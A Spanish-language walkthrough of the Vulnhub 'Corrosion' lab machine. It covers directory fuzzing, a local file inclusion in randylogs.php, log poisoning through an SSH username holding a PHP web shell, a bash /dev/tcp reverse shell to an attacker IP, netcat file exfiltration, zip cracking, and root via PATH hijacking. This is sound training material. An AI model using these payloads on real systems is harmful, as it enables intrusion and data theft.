---
title: Vulnhub - Corrosion
author: cotes
date: 2023-09-06 17:51:00 +0800
categories: [Writeup, Vulnhub, Easy]
tags: [Linux, 'LFI to RCE', 'Path Hijacking']
math: true
mermaid: true
image:
  path: /assets/images/Vulnhub/Easy/Corrosion/logo.jpg
  lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA
  alt: Corrosion Machine Logo
---

Máquina Linux de nivel **Easy** de Vulnhub.

Técnicas usadas: **LFI to RCE, Path Hijacking**

### Fase de Reconocimiento 🧣

a. Enumeramos los puertos que están abiertos.

* **`nmap -p- -sS -Pn -n <IP> -oG puertos`**

    ![](/assets/images/Vulnhub/Easy/Corrosion/01-ports.png)

b. Vemos las versiones de los servicios que se están ejecutando en los puertos.

* **`nmap -p<Ports> -sCV <IP> -oN versiones`**

    ![](/assets/images/Vulnhub/Easy/Corrosion/02-versions.png)

c. Si visitamos el servicio web veremos la página por defecto de **Apache** por lo que haremos fuzzing de directorio con **wfuzz**

```bash
wfuzz -c -t 100 --hc=404  -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt 'http://<IP Corrosion>/FUZZ/'
--------------------------------------------------------------------------------------------------------------------------------------------
000012064:   200        16 L     59 W       947 Ch      "tasks"
000021781:   200        11 L     27 W       190 Ch      "blog-post"
```

* **/tasks/task_todo.txt**

    ```bash
    # Tasks that need to be completed

    1. Change permissions for auth log
    2. Change port 22 -> 7672
    3. Set up phpMyAdmin
    ```

* Ahora haremos fuzzing en el directorio **/blog-post**

    ```bash
    wfuzz -c -t 100 --hc=404 -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt 'http://<IP Corrosion>/blog-post/FUZZ/'
    -----------------------------------------------------------------------------------------------------------------------------------------------------
    000000030:   200        16 L     60 W       984 Ch      "archives"   
    000000150:   200        11 L     27 W       190 Ch      "uploads"
    ```

* Al visitar el directorio **archives** encontramos el archivo randylogs.php, pero, no veremos nada, por lo que haremos fuzzing de parámetros, para intentar leer el archivo **/etc/passwd**

    ```bash
    wfuzz -c -t 100 --hc=404 --hh=0 -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt 'http://<IP Corrosion>/blog-post/archives/randylogs.php?FUZZ=/etc/passwd'
    ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    000000727:   200        48 L     85 W       2832 Ch     "file"
    ```

d. Con el parámetro file podemos leer archivos de la máquina víctima. En la **Máquina Víctima** existe el usuario **randy**, pero, no tiene una clave id_rsa para conectarnos por SSH, por lo que veremos que podemos leer el archivo de logs del servicio SSH

* **URL:** **`http://<IP Corrosion>/blog-post/archives/randylogs.php?file=/var/log/auth.log`**

    ```bash
    Aug  6 04:55:31 corrosion dbus-daemon[598]: [system] Failed to activate service 'org.bluez': timed out (service_start_timeout=25000ms)
    Aug  6 09:56:03 corrosion CRON[1470]: pam_unix(cron:session): session opened for user root by (uid=0)
    Aug  6 09:56:03 corrosion CRON[1470]: pam_unix(cron:session): session closed for user root
    Aug  6 09:57:02 corrosion CRON[1475]: pam_unix(cron:session): session opened for user root by (uid=0)
    <SNIP>
    ```
    > Tenemos capacidad de lectura del archivo **auth.log** (SSH)

e. Ahora, inyectaremos código **php** en el nombre del usuario con el que nos autenticamos en el servicio SSH

```bash
atacante@kali> ssh '<?php system($_GET["cmd"]); ?>'@<IP Corrosion>
```

* Colocamos cualquier cosa como contraseña una sola vez, y ya seremos capaces de ejecutar comandos a través del LFI

* **URL:** http://<IP Corrosion>/blog-post/archives/randylogs.php?file=/var/log/auth.log&cmd=ls%20-la

    ```bash
    <SNIP>
    drwxr-xr-x 2 root root 4096 Jul 29  2021 .
    drwxr-xr-x 4 root root 4096 Jul 29  2021 ..
    -rwxr-xr-x 1 root root  140 Jul 29  2021 randylogs.php
    <SNIP>
    ```

f. Para entablarnos una reverse shell urlencodeamos el payload

```bash
atacante@kali> echo -n "bash -c 'bash -i >& /dev/tcp/<IP Atacante>/4444 0>&1'" | jq -rRs @uri
bash%20-c%20'bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F<IP Atacante>%2F4444%200%3E%261'
```

![](/assets/images/Vulnhub/Easy/Corrosion/03-payload.png)

* Nos ponemos en escucha con **nc** antes de enviar el payload

```bash
bash: no job control in this shell
www-data@corrosion:/var/www/html/blog-post/archives$ 
```

### Escalada de Privilegios 💹

a. Nos encontramos el archivo **user_backup.zip** en **/var/backups**, el cual nos transferimos a nuestra **Máquina Atacante**

```bash
atacante@kali> nc -lvnp 4445 > user.zip
```

```bash
www-data@corrosion:/var/backups$ nc 192.168.100.70 4445 < user_backup.zip
```

* El fichero está encriptado, así que conseguiremos el **hash** con **zip2john user.zip > hash** y lo romperemos con **john**

    ```bash
    atacante@kali> john hash --show                             
    !randybaby
    ```

b. Entre los ficheros veremos la contraseña del usuario **randy** y un script en **c**

```c
#include<unistd.h>
void main()
{ setuid(0);
  setgid(0);
  system("/usr/bin/date");

  system("cat /etc/hosts");

  system("/usr/bin/uname -a");
}
```
> El comando cat se llama de forma relativa por lo que es vulnerable a **Path Hijacking**

c. Nos convertimos en randy y vemos nuestros privilegios a nivel de sudoers

```bash
randy@corrosion:/var/backups$ sudo -l
<SNIP>
(root) PASSWD: /home/randy/tools/easysysinfo
```

* El fichero que podemos ejecutar como root es el mismo que vimos al descomprimir **user.zip**

    ```bash
    randy@corrosion:/tmp$ echo 'bash' > cat
    randy@corrosion:/tmp$ chmod +x cat 
    randy@corrosion:/tmp$ export PATH=/tmp:$PATH
    ```

d. Ahora solo ejecutamos el **binario** y seremos root

```bash
randy@corrosion:~/tools$ ./easysysinfo
Sun Aug  6 11:18:56 AM MDT 2023
root@corrosion:~/tools#
```